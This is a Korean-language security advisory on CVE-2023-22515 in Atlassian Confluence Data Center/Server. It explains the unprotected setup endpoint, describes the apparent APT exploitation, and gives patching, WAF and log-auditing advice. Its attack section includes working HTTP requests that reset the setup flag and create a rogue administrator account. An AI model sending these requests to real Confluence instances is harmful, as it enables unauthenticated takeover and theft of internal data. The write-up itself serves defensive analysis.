# CVE-2023-22515 - Atlassian Confluence Broken Access Control

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2023-22515 |
| CVSS | 10.0 (Critical) |
| 영향 소프트웨어 | Atlassian Confluence Data Center / Server |
| 영향 버전 | 8.0.0 ~ 8.5.1 |
| 수정 버전 | 8.3.3, 8.4.3, 8.5.2 이상 |
| 공격 유형 | Broken Access Control → 관리자 권한 탈취 |
| 발견일 | 2023-10-04 |

## 영향 범위 & 심각성

Atlassian Confluence는 전 세계 기업에서 가장 널리 사용하는 위키/지식관리 플랫폼이다. 내부 문서, 설계 자료, 비밀 정보가 집중되는 핵심 시스템이다.

**실제 피해:**
- 공개 전부터 국가지원 APT(Storm-0062 추정)가 제로데이로 악용
- 인증 없이 관리자 계정을 생성하여 Confluence 인스턴스 완전 장악
- 내부 위키에 저장된 인프라 정보, API 키, 아키텍처 문서 유출
- CVSS 10.0 만점 — 원격, 인증 불필요, 복잡도 낮음
- Confluence Cloud 버전은 영향 없음 (Data Center/Server만 해당)

## 취약점 기술 분석

### 근본 원인

Confluence의 초기 설정(Setup) 엔드포인트에 대한 접근 제어가 부재하다.

**메커니즘:**
1. `/setup/setupadministrator.action` 엔드포인트가 설치 완료 후에도 접근 가능
2. 특정 HTTP 파라미터를 통해 설정 모드를 강제 활성화
3. 활성화된 설정 모드에서 새 관리자 계정을 생성
4. 생성된 관리자로 로그인하여 전체 시스템 제어

### 핵심 문제

```
인터넷 → Confluence → /setup/* 엔드포인트 (접근제어 없음) → 관리자 생성
```

- **설치 엔드포인트 미보호**: 초기 설정용 URL이 운영 중에도 접근 가능
- **상태 검증 부재**: "이미 설치 완료됨"에 대한 서버 측 검증 미흡
- **파라미터 조작**: HTTP 요청 파라미터로 내부 상태를 변경할 수 있는 구조

## 공격 시나리오

### 단계별 공격

1. **대상 식별**: 인터넷에 노출된 Confluence 인스턴스 탐색
2. **설정 모드 활성화**: 특수 파라미터를 포함한 요청 전송
3. **관리자 계정 생성**: Setup 위저드를 통해 새 admin 계정 생성
4. **시스템 장악**: 관리자 권한으로 플러그인 설치, 데이터 접근

```http
# 설정 모드 강제 활성화 (교육 목적)
GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1
Host: target-confluence

# 관리자 계정 생성
POST /setup/setupadministrator.action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&fullName=Admin&email=att@evil.com&password=P@ss&confirm=P@ss
```

### 공격 결과
- Confluence 전체 데이터 접근 (모든 Space, 페이지)
- 악성 플러그인 설치를 통한 서버 RCE
- 연동된 Jira, Bitbucket 등 다른 Atlassian 제품 접근
- 내부 네트워크 정보 수집 후 횡이동

## 방어 방법

### 즉시 조치
1. **패치 적용**: 8.3.3, 8.4.3, 8.5.2 이상으로 업그레이드
2. **임시 차단**: `/setup/*` URL 패턴을 WAF/리버스 프록시에서 차단
3. **침해 확인**: 최근 생성된 관리자 계정 및 의심스러운 사용자 감사

```bash
# Confluence 로그에서 의심스러운 설정 접근 확인
grep -r "setupadministrator" /var/atlassian/confluence/logs/
```

### 장기 대책
- Confluence를 인터넷에 직접 노출하지 않음 (VPN/Zero Trust 경유)
- Confluence Cloud로 마이그레이션 검토
- 관리자 계정 변경 알림 설정
- 정기적 사용자/권한 감사 자동화

## 교훈

1. **CVSS 10.0의 의미**: 원격 + 인증 불필요 + 낮은 복잡도 = 최악의 조합
2. **설치 엔드포인트 보호**: 초기 설정용 기능은 설치 완료 후 반드시 비활성화/제거
3. **인터넷 노출 최소화**: 내부 도구를 인터넷에 노출하면 공격 표면이 극대화됨
4. **Atlassian 보안 권고 모니터링**: Confluence는 반복적으로 크리티컬 취약점이 발견됨
5. **제로 트러스트 적용**: 내부 서비스라도 인증/인가를 계층적으로 적용

## 참고 자료

- [NVD - CVE-2023-22515](https://nvd.nist.gov/vuln/detail/CVE-2023-22515)
- [Atlassian Security Advisory](https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html)
- [Microsoft Threat Intelligence - Storm-0062](https://www.microsoft.com/en-us/security/blog/2023/10/04/storm-0062-exploiting-cve-2023-22515/)
- [Rapid7 AttackerKB 분석](https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515)
